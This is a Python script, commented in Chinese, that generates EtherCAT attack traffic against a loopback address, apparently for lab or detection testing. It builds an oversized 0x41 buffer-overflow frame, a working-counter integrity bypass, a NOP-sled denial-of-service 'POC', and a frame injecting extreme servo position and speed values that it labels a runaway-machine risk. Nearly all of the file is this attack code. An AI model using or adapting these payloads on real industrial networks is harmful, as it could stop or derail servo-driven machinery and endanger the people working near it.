from ec_base import *

DEST_ADDR = LOOPBACK_DST

# 漏洞1：IO缓冲区溢出探测（大量0x41填充A字符）
def scan_io_buffer_overflow():
    overflow_payload = b"A" * 4096
    frame = build_ecat_frame(slave_cnt=4, wkc=12, payload=overflow_payload)
    send_ec_pkt(DEST_ADDR, sport=55200, full_frame=frame)
    ECLog.warn("EtherCAT原生漏洞探测：超长IO载荷缓冲区溢出扫描包（0x41填充）")

# 漏洞2：WKC工作计数器完整性绕过探测
def scan_wkc_bypass():
    # WKC置0，跳过从站数据校验逻辑
    bad_io_data = struct.pack("<fff", 0, 0, 0)
    frame = build_ecat_frame(slave_cnt=4, wkc=0, payload=bad_io_data)
    send_ec_pkt(DEST_ADDR, sport=55201, full_frame=frame)
    ECLog.warn("EtherCAT原生漏洞探测：非法WKC值完整性校验绕过扫描包")

# POC1：缓冲区溢出DoS攻击载荷（NOP雪橇0x90）
def poc_overflow_dos():
    shellcode = b"\x90" * 256 + b"\xff\xff\xff\xff"
    exp_frame = build_ecat_frame(slave_cnt=4, wkc=12, payload=shellcode)
    send_ec_pkt(DEST_ADDR, sport=55202, full_frame=exp_frame)
    ECLog.exploit("EtherCAT DoS攻击POC：IO缓冲区溢出，伺服/机器人停机失控")

# POC2：WKC劫持篡改运动参数POC
def poc_wkc_hijack():
    # 恶意极端运动参数
    hijack_io = struct.pack("<fff", 99999.9, -200.0, 99.9)
    exp_frame = build_ecat_frame(slave_cnt=4, wkc=0, payload=hijack_io)
    send_ec_pkt(DEST_ADDR, sport=55203, full_frame=exp_frame)
    ECLog.exploit("EtherCAT完整性绕过POC：篡改伺服位置转速，设备飞车风险")

if __name__ == "__main__":
    print("===== EtherCAT 原生漏洞扫描 + POC攻击流量生成 =====")
    scan_io_buffer_overflow()
    scan_wkc_bypass()
    poc_overflow_dos()
    poc_wkc_hijack()
    print("===== 攻击流量发送完成，Wireshark过滤 udp.port == 8899 查看恶意报文 =====\n")